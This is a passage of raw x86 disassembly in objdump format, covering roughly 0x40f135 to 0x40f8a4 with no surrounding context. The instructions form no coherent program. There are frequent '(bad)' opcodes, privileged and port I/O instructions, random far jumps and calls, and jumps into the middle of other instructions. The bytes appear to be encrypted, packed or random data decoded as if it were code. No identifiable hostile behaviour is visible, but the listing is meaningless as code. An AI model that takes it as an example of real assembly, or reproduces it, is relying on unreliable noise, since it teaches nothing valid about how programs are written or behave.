  40f135:	sub    ch,BYTE PTR [esi+0x72e7426d]
  40f13b:	popf   
  40f13c:	pop    eax
  40f13d:	mov    ds,WORD PTR [esi-0x1a]
  40f140:	xchg   esi,esp
  40f142:	xor    al,0x67
  40f144:	mov    dl,BYTE PTR [ebp+0x36b7cc78]
  40f14a:	or     eax,0x3b5575a2
  40f14f:	stos   DWORD PTR es:[edi],eax
  40f150:	ss xchg esi,eax
  40f152:	cmc    
  40f153:	mov    al,ds:0x10752714
  40f158:	lds    ebp,FWORD PTR [edx+esi*4+0x4]
  40f15c:	test   al,0xf
  40f15e:	cld    
  40f15f:	hlt    
  40f160:	sbb    eax,0xb9c22995
  40f165:	and    BYTE PTR [ebx-0x76],cl
  40f168:	or     ebp,DWORD PTR [ebx+0x56]
  40f16b:	out    dx,al
  40f16c:	outs   dx,BYTE PTR ds:[esi]
  40f16d:	push   0xdab361d2
  40f172:	pop    ss
  40f173:	loope  0x40f177
  40f175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f176:	pop    ebp
  40f177:	mov    bl,0xae
  40f179:	jl     0x40f15b
  40f17b:	sbb    edi,ebx
  40f17d:	aad    0x59
  40f17f:	push   ebx
  40f180:	fisubr DWORD PTR [ebp+edi*1+0x7]
  40f184:	xchg   edx,eax
  40f185:	ins    DWORD PTR es:[edi],dx
  40f186:	out    dx,eax
  40f187:	das    
  40f188:	lods   eax,DWORD PTR ds:[esi]
  40f189:	pop    ss
  40f18a:	sub    ecx,DWORD PTR [ecx+0x66]
  40f18d:	arpl   WORD PTR [esi+0x3d],ax
  40f190:	lock (bad) 
  40f192:	ret    0xaa9b
  40f195:	cmp    al,0x4c
  40f197:	dec    eax
  40f198:	inc    esi
  40f199:	pop    esp
  40f19a:	call   0x34a31615
  40f19f:	lods   eax,DWORD PTR ds:[esi]
  40f1a0:	lods   al,BYTE PTR ds:[esi]
  40f1a1:	ret    0x3adb
  40f1a4:	imul   edi,DWORD PTR [esi+0x5571c26],0x4c
  40f1ab:	cmp    ebx,edx
  40f1ad:	sbb    ebp,DWORD PTR [eax+0x5b]
  40f1b0:	lods   al,BYTE PTR ds:[esi]
  40f1b1:	inc    esp
  40f1b2:	push   0xffffffe8
  40f1b4:	push   0xd2e5708b
  40f1b9:	or     eax,0x8d32eeb3
  40f1be:	mov    bh,0x99
  40f1c0:	adc    DWORD PTR [eax-0x7f],0xe01e77aa
  40f1c7:	arpl   WORD PTR [esi+0x1c3253a8],sp
  40f1cd:	stos   DWORD PTR es:[edi],eax
  40f1ce:	jbe    0x40f161
  40f1d0:	mov    ah,0xdc
  40f1d2:	lods   al,BYTE PTR ds:[esi]
  40f1d3:	popa   
  40f1d4:	nop
  40f1d5:	call   0x5adb2ff8
  40f1da:	ins    DWORD PTR es:[edi],dx
  40f1db:	bound  ebx,QWORD PTR ds:0x39b9b99d
  40f1e1:	and    ch,BYTE PTR [ebx-0x44976aa6]
  40f1e7:	dec    edx
  40f1e8:	daa    
  40f1e9:	pop    ss
  40f1ea:	xor    ebp,DWORD PTR ds:0xa40ca071
  40f1f0:	ret    
  40f1f1:	rol    BYTE PTR [edx+edx*4-0x5ee2872e],cl
  40f1f8:	dec    ebp
  40f1f9:	sbb    dl,al
  40f1fb:	or     eax,0x5e0f1578
  40f200:	cmp    esp,eax
  40f202:	ret    
  40f203:	shl    DWORD PTR [edi-0x1f],1
  40f206:	xchg   ecx,eax
  40f207:	imul   esp,esi,0xffffffae
  40f20a:	dec    eax
  40f20b:	add    eax,0x5628c020
  40f210:	sub    esp,0x3c6650ac
  40f216:	jmp    0x40f21a
  40f218:	cli    
  40f219:	clc    
  40f21a:	fwait
  40f21b:	xchg   bh,dl
  40f21d:	fimul  DWORD PTR [ebx-0x1b1cb026]
  40f223:	daa    
  40f224:	push   cs
  40f225:	sbb    eax,0x7df01c27
  40f22a:	pusha  
  40f22b:	fsub   QWORD PTR [edx]
  40f22d:	hlt    
  40f22e:	dec    ebx
  40f22f:	add    al,0x62
  40f231:	and    bl,bl
  40f233:	mov    dh,0xe2
  40f235:	mov    esp,DWORD PTR [edx+ebx*2-0x484920d1]
  40f23c:	stc    
  40f23d:	push   edi
  40f23e:	shl    DWORD PTR [edi+0x2a077748],0x62
  40f245:	push   ecx
  40f246:	xor    al,0x8b
  40f248:	and    al,dh
  40f24a:	imul   ebp,DWORD PTR [edi-0xf1f824b],0x281e1a72
  40f254:	daa    
  40f255:	into   
  40f256:	imul   esi,DWORD PTR [ecx+0x67],0x162aa24c
  40f25d:	mov    BYTE PTR [ebp+0x2af1dee8],dh
  40f263:	iret   
  40f264:	jl     0x40f276
  40f266:	in     eax,dx
  40f267:	push   0x11
  40f269:	mov    al,ds:0xbfff81a1
  40f26e:	mov    ebp,0x75ab939c
  40f273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f274:	sbb    BYTE PTR [edx],bh
  40f276:	jle    0x40f24f
  40f278:	xor    al,0xab
  40f27a:	push   ebx
  40f27b:	retf   
  40f27c:	and    cl,al
  40f27e:	pop    eax
  40f27f:	pop    ecx
  40f280:	push   edx
  40f281:	push   esp
  40f282:	jmp    0x77f71f63
  40f287:	clc    
  40f288:	push   ebp
  40f289:	mov    ebp,0x20604ee6
  40f28e:	inc    edx
  40f28f:	jbe    0x40f2bf
  40f291:	jmp    FWORD PTR [ecx+edi*2+0xfcf0d31]
  40f298:	pop    edx
  40f299:	sahf   
  40f29a:	(bad)  
  40f29c:	rcl    edi,cl
  40f29e:	stos   BYTE PTR es:[edi],al
  40f29f:	out    0x25,al
  40f2a1:	sahf   
  40f2a2:	mov    bh,BYTE PTR [ebx+edx*4+0x55]
  40f2a6:	stos   BYTE PTR es:[edi],al
  40f2a7:	stos   DWORD PTR es:[edi],eax
  40f2a8:	fwait
  40f2a9:	int    0x39
  40f2ab:	iret   
  40f2ac:	inc    edi
  40f2ad:	dec    ebp
  40f2ae:	sub    eax,0x450f6d86
  40f2b3:	pop    edx
  40f2b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2b5:	sbb    ebp,DWORD PTR [eax]
  40f2b7:	add    ch,al
  40f2b9:	dec    edx
  40f2ba:	(bad)  
  40f2bc:	cmp    BYTE PTR [eax+0xd],al
  40f2bf:	xchg   edi,eax
  40f2c0:	add    DWORD PTR [ebx],esp
  40f2c2:	adc    esp,ebp
  40f2c4:	cmp    DWORD PTR [esi+0x222a8e60],0x5d3f563b
  40f2ce:	add    al,0x31
  40f2d0:	imul   eax,DWORD PTR ds:0x70d7967,0xe0c2f4a1
  40f2da:	test   DWORD PTR [ecx+0x70],edi
  40f2dd:	(bad)  
  40f2de:	std    
  40f2df:	xchg   al,ah
  40f2e1:	mov    bh,0x7e
  40f2e3:	sub    al,0xee
  40f2e5:	add    BYTE PTR [eax],al
  40f2e7:	jbe    0x40f309
  40f2e9:	(bad)  
  40f2ea:	stos   BYTE PTR es:[edi],al
  40f2eb:	or     ebx,ecx
  40f2ed:	and    BYTE PTR [edx+edi*4+0x817a437],al
  40f2f4:	sub    edx,DWORD PTR [edx+0x58454566]
  40f2fa:	inc    ebx
  40f2fb:	sahf   
  40f2fc:	xor    al,0xc0
  40f2fe:	je     0x40f2f2
  40f300:	idiv   DWORD PTR [edi-0x41ce08ea]
  40f306:	shr    DWORD PTR [ecx+ebx*1],0x7a
  40f30a:	sahf   
  40f30b:	jb     0x40f29b
  40f30d:	xor    al,BYTE PTR [ebp-0x56]
  40f310:	xchg   ebx,eax
  40f311:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f312:	(bad)  
  40f313:	mov    ds:0x97677671,eax
  40f318:	and    dh,BYTE PTR [ebx]
  40f31a:	cmc    
  40f31b:	sub    eax,0x5965d238
  40f320:	mov    ds:0xf7ea5dcc,eax
  40f325:	pop    esi
  40f326:	ret    
  40f327:	push   esp
  40f328:	xor    eax,0x918fd5e9
  40f32d:	and    DWORD PTR [edx-0x60],ebx
  40f330:	and    DWORD PTR ds:0x694cdb97,0x33bfc80
  40f33a:	jb     0x40f349
  40f33c:	inc    ebx
  40f33d:	fcmovu st,st(7)
  40f33f:	xchg   edi,edx
  40f341:	dec    ecx
  40f342:	sahf   
  40f343:	push   0xffffffe1
  40f345:	or     BYTE PTR [esp+edx*2-0x4],cl
  40f349:	mov    esi,0x1851f377
  40f34e:	pop    ss
  40f34f:	jb     0x40f3c8
  40f351:	push   edx
  40f352:	adc    DWORD PTR [eax+0x594142c5],0xffffff8a
  40f359:	sahf   
  40f35a:	mov    edx,0x882e9b
  40f35f:	fidiv  DWORD PTR [ebp+0x73d3e0d1]
  40f365:	rol    DWORD PTR [edx-0x3e0da8f3],cl
  40f36b:	inc    esp
  40f36c:	mov    dh,0x6b
  40f36e:	adc    eax,0x1f236b9b
  40f373:	jmp    0x1f30aa39
  40f378:	mov    dh,0x2b
  40f37a:	fwait
  40f37b:	stos   BYTE PTR es:[edi],al
  40f37c:	dec    BYTE PTR [edx]
  40f37e:	pop    edx
  40f37f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f380:	ss sub eax,0xe3033231
  40f386:	test   DWORD PTR [eax+edx*1],esp
  40f389:	dec    ecx
  40f38a:	sub    esp,DWORD PTR [ebp-0x31ff9c3d]
  40f390:	cmc    
  40f391:	inc    esi
  40f392:	sub    ebp,DWORD PTR ds:[ecx]
  40f395:	rcl    BYTE PTR [ecx+ebp*8-0x603eaa8b],cl
  40f39c:	push   es
  40f39d:	leave  
  40f39e:	mov    ah,0xc7
  40f3a0:	pop    ebp
  40f3a1:	pop    ebp
  40f3a2:	enter  0x35e5,0xef
  40f3a6:	or     DWORD PTR [ebp+0x1909e8fd],ebp
  40f3ac:	dec    eax
  40f3ad:	mov    al,0xf9
  40f3af:	rol    DWORD PTR [ebx],1
  40f3b1:	arpl   di,dx
  40f3b3:	inc    ebp
  40f3b4:	imul   ebx,DWORD PTR cs:[esi],0x57
  40f3b8:	add    al,al
  40f3ba:	ret    0xa62c
  40f3bd:	mov    ds:0xa2cd9f44,eax
  40f3c2:	push   ebx
  40f3c3:	mov    dh,0xf2
  40f3c5:	dec    edx
  40f3c6:	ret    
  40f3c7:	cmp    ebx,0x480167a8
  40f3cd:	int    0xce
  40f3cf:	xor    BYTE PTR [esi+edi*1-0x592410d8],cl
  40f3d6:	inc    ecx
  40f3d7:	test   eax,edx
  40f3d9:	pop    edi
  40f3da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3db:	lock repz push esp
  40f3de:	mov    ebp,0x8b876e4c
  40f3e3:	rcr    DWORD PTR [edi+edi*4-0x2f],1
  40f3e7:	pusha  
  40f3e8:	fdivr  DWORD PTR [edx+0x50]
  40f3eb:	popf   
  40f3ec:	ror    bl,cl
  40f3ee:	out    0x11,al
  40f3f0:	test   al,0x10
  40f3f2:	pop    edi
  40f3f3:	mov    edi,0xdf2d37a8
  40f3f8:	xor    DWORD PTR [eax],ebp
  40f3fa:	mov    WORD PTR [ebx+ebp*1],es
  40f3fd:	jg     0x40f43a
  40f3ff:	pop    es
  40f400:	outs   dx,BYTE PTR ds:[esi]
  40f401:	pop    ecx
  40f402:	int3   
  40f403:	push   ebp
  40f404:	pop    ecx
  40f405:	into   
  40f406:	popf   
  40f407:	jo     0x40f395
  40f409:	inc    edx
  40f40a:	sub    al,0xcc
  40f40c:	imul   edx,DWORD PTR [ebp-0x26],0xfffffffa
  40f410:	cs mov bh,0x53
  40f413:	in     eax,0xd4
  40f415:	jecxz  0x40f466
  40f417:	and    BYTE PTR [edi-0x20],ah
  40f41a:	pop    eax
  40f41b:	shl    BYTE PTR [edi+0x19],1
  40f41e:	push   esp
  40f41f:	js     0x40f3c4
  40f421:	or     DWORD PTR [eax-0x59],ebx
  40f424:	jmp    0x40f3e6
  40f426:	sbb    eax,0x9311bed
  40f42b:	(bad)  
  40f42c:	je     0x40f406
  40f42e:	jb     0x40f45d
  40f430:	ds (bad) 
  40f432:	jnp    0x40f493
  40f434:	and    ch,BYTE PTR [edi+eiz*1]
  40f437:	aas    
  40f438:	push   0xc7de2ba3
  40f43d:	stc    
  40f43e:	neg    edi
  40f440:	arpl   si,dx
  40f442:	ds jbe 0x40f40a
  40f445:	mov    DWORD PTR [edx+ebx*1],eax
  40f448:	(bad)  [ebx+0x32]
  40f44b:	xchg   edx,eax
  40f44c:	aas    
  40f44d:	loop   0x40f468
  40f44f:	mov    ah,0x63
  40f451:	cdq    
  40f452:	mov    edx,0x5c7a65dd
  40f457:	pushf  
  40f458:	sub    esi,DWORD PTR [eax+0x344315d9]
  40f45e:	push   edx
  40f45f:	popf   
  40f460:	inc    ecx
  40f461:	lods   al,BYTE PTR ds:[esi]
  40f462:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f463:	(bad)  
  40f465:	jno    0x40f465
  40f467:	mov    edi,DWORD PTR [ecx+0x37]
  40f46a:	sahf   
  40f46b:	les    ebp,FWORD PTR [ebp-0x18490373]
  40f471:	fild   QWORD PTR [edx]
  40f473:	fwait
  40f474:	xchg   edx,eax
  40f475:	(bad)  
  40f477:	xchg   edx,eax
  40f478:	mov    ds:0xbe3fa96b,eax
  40f47d:	jmp    FWORD PTR [ebx-0x5]
  40f480:	push   0x5d
  40f482:	js     0x40f445
  40f484:	xchg   ebp,eax
  40f485:	fsubr  DWORD PTR [ebp-0x71]
  40f488:	jmp    edi
  40f48a:	dec    ebx
  40f48b:	pop    ds
  40f48c:	dec    edi
  40f48d:	sti    
  40f48e:	(bad)  [eax-0x44]
  40f491:	jne    0x40f46f
  40f493:	xchg   ebp,eax
  40f494:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f495:	mov    edx,0xf26366ea
  40f49a:	(bad)  
  40f49c:	dec    esp
  40f49d:	adc    al,0x91
  40f49f:	ret    0x708
  40f4a2:	mov    al,0xf9
  40f4a4:	jae    0x40f4dd
  40f4a6:	cmp    eax,0x3094c85e
  40f4ab:	adc    BYTE PTR [ebx-0x46],dh
  40f4ae:	test   al,0x9a
  40f4b0:	add    esi,DWORD PTR [esi+edi*1-0x781b12a7]
  40f4b7:	sub    ebx,DWORD PTR [ebx+0x5299d25d]
  40f4bd:	push   esp
  40f4be:	aas    
  40f4bf:	pop    edx
  40f4c0:	pop    es
  40f4c1:	ja     0x40f50c
  40f4c3:	test   al,0xe0
  40f4c5:	dec    eax
  40f4c6:	fild   WORD PTR [ebx]
  40f4c8:	shl    dh,1
  40f4ca:	xchg   edx,eax
  40f4cb:	enter  0xd803,0xd5
  40f4cf:	cmc    
  40f4d0:	mov    al,0x4
  40f4d2:	cmp    bh,BYTE PTR ds:0x7d047890
  40f4d8:	inc    esi
  40f4d9:	bound  ecx,QWORD PTR [eax+0x1864a144]
  40f4df:	jp     0x40f4c3
  40f4e1:	hlt    
  40f4e2:	imul   ebx,DWORD PTR [eax+esi*4],0x8b8d288d
  40f4e9:	adc    bl,BYTE PTR [ecx+0x5305df31]
  40f4ef:	jle    0x40f4a4
  40f4f1:	push   ecx
  40f4f2:	mov    ah,0xe1
  40f4f4:	repz (bad) 
  40f4f6:	mov    al,0x97
  40f4f8:	enter  0x2b07,0x5
  40f4fc:	call   0x2987156c
  40f501:	retf   
  40f502:	(bad)  
  40f503:	xor    ch,dl
  40f505:	jbe    0x40f55c
  40f507:	je     0x40f518
  40f509:	inc    esi
  40f50a:	popa   
  40f50b:	rcr    DWORD PTR ds:0xa46aef8f,1
  40f511:	rcl    BYTE PTR [edi-0x1522b126],0xeb
  40f518:	xor    BYTE PTR [ebp-0x21cb6415],dl
  40f51e:	popf   
  40f51f:	lahf   
  40f520:	pop    ss
  40f521:	sub    eax,0x4aeb9e4b
  40f526:	xchg   BYTE PTR [ebp+0x16544b50],al
  40f52c:	fbld   TBYTE PTR [edi+0x40945a32]
  40f532:	stos   BYTE PTR es:[edi],al
  40f533:	jns    0x40f593
  40f535:	(bad)  
  40f538:	pop    ecx
  40f539:	popa   
  40f53a:	jb     0x40f581
  40f53c:	jle    0x40f587
  40f53e:	leave  
  40f53f:	or     eax,0x6bfd57d2
  40f544:	fdivp  st(0),st
  40f546:	jbe    0x40f545
  40f548:	les    ecx,FWORD PTR [ecx]
  40f54a:	push   ebx
  40f54b:	gs stc 
  40f54d:	mov    edx,0x3c269252
  40f552:	sub    DWORD PTR [eax],edx
  40f554:	pop    ebp
  40f555:	fidivr WORD PTR [ecx]
  40f557:	sub    al,0x4
  40f559:	sbb    esp,DWORD PTR [edx+0x488a08ee]
  40f55f:	mov    BYTE PTR [eax],al
  40f561:	es lahf 
  40f563:	and    ah,BYTE PTR [ebp+0x25]
  40f566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f567:	mov    BYTE PTR [ecx+0x55],ch
  40f56a:	xlat   BYTE PTR ds:[ebx]
  40f56b:	and    dl,BYTE PTR [edx*1+0x75b619a6]
  40f572:	and    BYTE PTR [ebx-0x19],dh
  40f575:	nop
  40f576:	and    al,0x22
  40f578:	and    al,ah
  40f57a:	mov    dl,0x83
  40f57c:	(bad)  
  40f57d:	icebp  
  40f57e:	xchg   ecx,eax
  40f57f:	addr16 in eax,0x77
  40f582:	sbb    eax,0x2ac1b769
  40f587:	push   es
  40f588:	enter  0x2319,0xe4
  40f58c:	je     0x40f553
  40f58e:	adc    eax,0x5a8457c3
  40f593:	and    ebx,edx
  40f595:	fisub  DWORD PTR [eax+eiz*2-0x502c4806]
  40f59c:	jp     0x40f5d0
  40f59e:	leave  
  40f59f:	lods   eax,DWORD PTR ds:[esi]
  40f5a0:	arpl   WORD PTR [eax],bp
  40f5a2:	add    al,0x92
  40f5a4:	retf   0x6071
  40f5a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5a8:	(bad)  
  40f5a9:	cs pushf 
  40f5ab:	cmc    
  40f5ac:	cmp    BYTE PTR [ebp-0x2c9ba14d],dh
  40f5b2:	sbb    al,BYTE PTR [edx]
  40f5b4:	push   eax
  40f5b5:	ficom  WORD PTR [edx-0x303720e]
  40f5bb:	jmp    0x40f61d
  40f5bd:	adc    al,0xd6
  40f5bf:	ret    
  40f5c0:	out    0xea,al
  40f5c2:	(bad)  
  40f5c3:	fsub   DWORD PTR [edx-0x8]
  40f5c6:	push   eax
  40f5c7:	mov    ds:0xc3ac483e,al
  40f5cc:	inc    esi
  40f5cd:	in     al,dx
  40f5ce:	pop    edx
  40f5cf:	div    BYTE PTR [esi+0x11029d0a]
  40f5d5:	outs   dx,BYTE PTR ds:[esi]
  40f5d6:	add    BYTE PTR [ebp-0x33890f36],dh
  40f5dc:	add    eax,0xefb62b6c
  40f5e1:	or     al,0x64
  40f5e3:	or     ah,BYTE PTR [edi]
  40f5e5:	push   edx
  40f5e6:	ss mov ebx,0xca62b6df
  40f5ec:	inc    ecx
  40f5ed:	mov    bl,dh
  40f5ef:	inc    esp
  40f5f0:	(bad)  
  40f5f1:	sub    BYTE PTR [eax+0x78],al
  40f5f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5f5:	int3   
  40f5f6:	fs inc ebp
  40f5f8:	mov    eax,0x54871b77
  40f5fd:	adc    eax,0x7e7891f5
  40f602:	and    cl,BYTE PTR [edi-0x67114ae]
  40f608:	mov    eax,0x794e1acd
  40f60d:	(bad)  
  40f60e:	mov    dh,0x77
  40f610:	mov    bl,BYTE PTR [ebp+0x2cffec89]
  40f616:	gs ss pushw ss
  40f61a:	xor    al,0x59
  40f61c:	jnp    0x40f695
  40f61e:	push   ebp
  40f61f:	jne    0x40f64a
  40f621:	(bad)  
  40f622:	lods   eax,DWORD PTR ds:[esi]
  40f623:	pop    ds
  40f624:	lods   eax,DWORD PTR ds:[esi]
  40f625:	call   0x25eb7a90
  40f62a:	add    al,0xad
  40f62c:	mov    WORD PTR [edi+0x28],fs
  40f62f:	ret    
  40f630:	out    0x55,eax
  40f632:	or     DWORD PTR [eax-0x683d5441],esp
  40f638:	sub    BYTE PTR [ebx],ah
  40f63a:	outs   dx,BYTE PTR ds:[esi]
  40f63b:	xor    dh,BYTE PTR [esi+eax*8+0x6a27a1ff]
  40f642:	push   es
  40f643:	pusha  
  40f644:	xchg   DWORD PTR [ecx+esi*1],eax
  40f647:	push   edi
  40f648:	mov    BYTE PTR [esi],0x98
  40f64b:	icebp  
  40f64c:	lock mov ah,0xd9
  40f64f:	leave  
  40f650:	xchg   edi,eax
  40f651:	push   esi
  40f652:	ja     0x40f62c
  40f654:	aaa    
  40f655:	into   
  40f656:	and    DWORD PTR [ebx+0x5b],ecx
  40f659:	jb     0x40f663
  40f65b:	pop    edx
  40f65c:	out    dx,eax
  40f65d:	jmp    0x8631:0x453d10dd
  40f664:	stos   BYTE PTR es:[edi],al
  40f665:	xlat   BYTE PTR ds:[ebx]
  40f666:	cwde   
  40f667:	and    eax,0x5a90ca34
  40f66c:	pop    ebp
  40f66d:	enter  0xd0a9,0xc7
  40f671:	add    eax,0xddb9d13
  40f676:	sbb    esp,eax
  40f678:	in     eax,dx
  40f679:	jecxz  0x40f60c
  40f67b:	neg    BYTE PTR [edi+ebp*1-0x48da3963]
  40f682:	xor    al,0xf4
  40f684:	adc    DWORD PTR [edi+0x6dbd7890],0xffffffc0
  40f68b:	sbb    ebp,DWORD PTR ds:0xd5061ae3
  40f691:	sbb    bl,BYTE PTR [ebp-0x51]
  40f694:	jmp    0x6f4cdb9f
  40f699:	or     BYTE PTR [edx+0x2dbf2c7c],dl
  40f69f:	repnz jecxz 0x40f62f
  40f6a2:	fidiv  WORD PTR [ebp-0xd01010f]
  40f6a8:	les    esi,FWORD PTR [eax-0x78]
  40f6ab:	mov    esp,0x989b32ea
  40f6b0:	jb     0x40f693
  40f6b2:	neg    DWORD PTR [eax+0x7e29ff1f]
  40f6b8:	dec    esp
  40f6b9:	loope  0x40f6e4
  40f6bb:	ins    BYTE PTR es:[edi],dx
  40f6bc:	adc    eax,DWORD PTR [ebp-0x76]
  40f6bf:	push   esi
  40f6c0:	cwde   
  40f6c1:	pop    esi
  40f6c2:	iret   
  40f6c3:	shr    BYTE PTR [ebx+0x1a],0x73
  40f6c7:	pop    ecx
  40f6c8:	js     0x40f6b7
  40f6ca:	mov    fs,WORD PTR [esi+ecx*2]
  40f6cd:	add    eax,0x329437bf
  40f6d2:	adc    bh,dl
  40f6d4:	lds    esp,FWORD PTR [ebx-0x33]
  40f6d7:	or     eax,0x7f297d27
  40f6dc:	arpl   WORD PTR [esp+edi*1+0x43ce50e],ax
  40f6e3:	enter  0x104e,0x77
  40f6e7:	xchg   esp,eax
  40f6e8:	not    BYTE PTR [eax]
  40f6ea:	dec    ebp
  40f6eb:	mov    ah,0x4a
  40f6ed:	idiv   BYTE PTR [esi-0x74]
  40f6f0:	std    
  40f6f1:	loop   0x40f69b
  40f6f3:	test   DWORD PTR [esi+0x44],0x54ec6173
  40f6fa:	and    BYTE PTR [ecx+edi*4-0x19bde778],dl
  40f701:	mov    ?,WORD PTR [esi-0x61c0ba59]
  40f707:	in     eax,dx
  40f708:	mov    ds:0x78cbf52e,eax
  40f70d:	pop    ecx
  40f70e:	cmp    BYTE PTR [esi+0x5d],0x37
  40f712:	int3   
  40f713:	pop    ecx
  40f714:	ss push ecx
  40f716:	int    0xfb
  40f718:	sub    al,0xe3
  40f71a:	push   edi
  40f71b:	ins    BYTE PTR es:[edi],dx
  40f71c:	push   0x5a
  40f71e:	repz retf 0x9e9
  40f722:	xchg   edx,eax
  40f723:	(bad)  
  40f724:	mov    dh,0xac
  40f726:	sub    DWORD PTR [esi-0x76],esp
  40f729:	addr16 sub esp,edi
  40f72c:	rcl    dh,1
  40f72e:	int3   
  40f72f:	adc    dh,BYTE PTR gs:[ebp-0x2c2ea033]
  40f736:	xor    DWORD PTR [ecx+0x71dcfd11],esi
  40f73c:	(bad)  
  40f73d:	in     al,0x7f
  40f73f:	pop    ss
  40f740:	and    BYTE PTR [eax-0x507daba8],al
  40f746:	sub    esi,DWORD PTR [eax]
  40f748:	mov    ebp,0x1a2387bb
  40f74d:	or     al,BYTE PTR [edi+edx*8+0x2f536335]
  40f754:	scas   al,BYTE PTR es:[edi]
  40f755:	and    BYTE PTR [ebx],dl
  40f757:	cmp    DWORD PTR [ecx-0x1d4b827f],ecx
  40f75d:	pop    es
  40f75e:	push   es
  40f75f:	cmp    DWORD PTR [ebx+0x33],ebp
  40f762:	dec    eax
  40f763:	sub    eax,0x2f3182b7
  40f768:	sti    
  40f769:	mov    ss,WORD PTR [esi+ecx*8-0x3a01e8d8]
  40f770:	mov    al,ds:0xe5fc4495
  40f775:	(bad)  
  40f776:	nop
  40f777:	dec    ebp
  40f778:	or     DWORD PTR [ebp-0x5f],esp
  40f77b:	test   BYTE PTR [ebp-0x4f],0x41
  40f77f:	mov    ch,0x9d
  40f781:	xor    eax,DWORD PTR [ecx-0x60]
  40f784:	pop    ebx
  40f785:	mov    al,ds:0xcb648f17
  40f78a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f78b:	jmp    0x40f770
  40f78d:	in     al,dx
  40f78e:	sbb    bh,BYTE PTR [ecx+0x73]
  40f791:	lds    esp,FWORD PTR [ebp-0x4c]
  40f794:	das    
  40f795:	sub    edx,ebx
  40f797:	retf   
  40f798:	(bad)  
  40f79a:	sar    BYTE PTR [ecx-0x6cfe84db],cl
  40f7a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7a1:	outs   dx,DWORD PTR ds:[esi]
  40f7a2:	sbb    ah,cl
  40f7a4:	inc    esp
  40f7a5:	(bad)  
  40f7a6:	stc    
  40f7a7:	add    eax,0xf1ab1917
  40f7ac:	lock push 0xffffffc7
  40f7af:	push   0x6dbc092b
  40f7b4:	or     eax,0x10f99b88
  40f7b9:	xor    eax,0xae521244
  40f7be:	sbb    DWORD PTR [edx-0x53],esp
  40f7c1:	sub    ebp,edi
  40f7c3:	adc    eax,0x363e9188
  40f7c8:	in     al,dx
  40f7c9:	out    0x25,al
  40f7cb:	(bad)  
  40f7cc:	stos   BYTE PTR es:[edi],al
  40f7cd:	push   0x4d
  40f7cf:	gs (bad) 
  40f7d1:	mul    BYTE PTR [eax]
  40f7d3:	push   cs
  40f7d4:	mov    edi,0x2a9c6e3f
  40f7d9:	inc    ebx
  40f7da:	daa    
  40f7db:	cmp    ecx,DWORD PTR ds:0xa7b72d14
  40f7e1:	aam    0x10
  40f7e3:	call   0x619f:0xe19f5eea
  40f7ea:	inc    ebx
  40f7eb:	jmp    0x40f863
  40f7ed:	push   ebp
  40f7ee:	repz cdq 
  40f7f0:	and    DWORD PTR [edi],ebp
  40f7f2:	cmp    BYTE PTR [edi],al
  40f7f4:	int    0x19
  40f7f6:	adc    eax,0x302be56a
  40f7fb:	push   cs
  40f7fc:	sbb    DWORD PTR [edi],eax
  40f7fe:	outs   dx,BYTE PTR ds:[esi]
  40f7ff:	add    BYTE PTR [ebp+eiz*1+0x39],bh
  40f803:	ficomp WORD PTR [esi+0x102cc4ff]
  40f809:	push   cs
  40f80a:	sub    al,0x51
  40f80c:	inc    edi
  40f80d:	aaa    
  40f80e:	pop    ss
  40f80f:	fs in  eax,0xd7
  40f812:	pop    ebp
  40f813:	cli    
  40f814:	push   0x63
  40f816:	in     eax,dx
  40f817:	sbb    ebp,edx
  40f819:	jmp    0x40f7d8
  40f81b:	xor    DWORD PTR [eax+0x17c82ea9],esp
  40f821:	cmp    ah,BYTE PTR [edx-0x2249efd0]
  40f827:	vpsrad ymm3,ymm4,xmm1
  40f82b:	push   eax
  40f82c:	mov    edi,DWORD PTR [esi-0x75]
  40f82f:	dec    edx
  40f830:	pop    ebx
  40f831:	ret    
  40f832:	dec    edi
  40f833:	neg    ah
  40f835:	mov    bh,0xb4
  40f837:	sahf   
  40f838:	push   esi
  40f839:	test   edx,0x20a998c0
  40f83f:	inc    eax
  40f840:	pop    ds
  40f841:	mov    ah,0x2e
  40f843:	ret    0x8d01
  40f846:	(bad)  
  40f847:	sub    al,0xd9
  40f849:	idiv   BYTE PTR [edx-0x3c]
  40f84c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f84d:	daa    
  40f84e:	dec    edx
  40f84f:	jno    0x40f837
  40f851:	popa   
  40f852:	sbb    al,dh
  40f854:	and    DWORD PTR [esi],esi
  40f856:	cld    
  40f857:	pop    ds
  40f858:	mov    WORD PTR [eax+0x5f],es
  40f85b:	inc    edi
  40f85c:	and    ebp,edx
  40f85e:	or     eax,DWORD PTR [edi+0x3f]
  40f861:	add    BYTE PTR [edx+0x68],dl
  40f864:	test   BYTE PTR [ebp+0x45],bl
  40f867:	addr16 cdq 
  40f869:	stos   DWORD PTR es:[edi],eax
  40f86a:	inc    ecx
  40f86b:	dec    edi
  40f86c:	xchg   ebp,eax
  40f86d:	mov    al,ds:0xb419c55b
  40f872:	ret    0xc43c
  40f875:	xlat   BYTE PTR ds:[ebx]
  40f876:	data16 mul BYTE PTR [ebx-0x76]
  40f87a:	jp     0x40f88c
  40f87c:	jmp    0x98d6:0xf4cb51dd
  40f883:	leave  
  40f884:	(bad)  
  40f885:	xlat   BYTE PTR ds:[ebx]
  40f886:	inc    esi
  40f887:	jmp    0x89212132
  40f88c:	xor    al,0xc
  40f88e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f88f:	dec    esp
  40f890:	pop    esi
  40f891:	lahf   
  40f892:	xor    eax,0xb868f7a3
  40f897:	mov    cl,0x7f
  40f899:	pop    esp
  40f89a:	xchg   BYTE PTR [eax+0x2065a891],al
  40f8a0:	push   ds
  40f8a1:	push   eax
  40f8a2:	ja     0x40f826
  40f8a4:	daa    
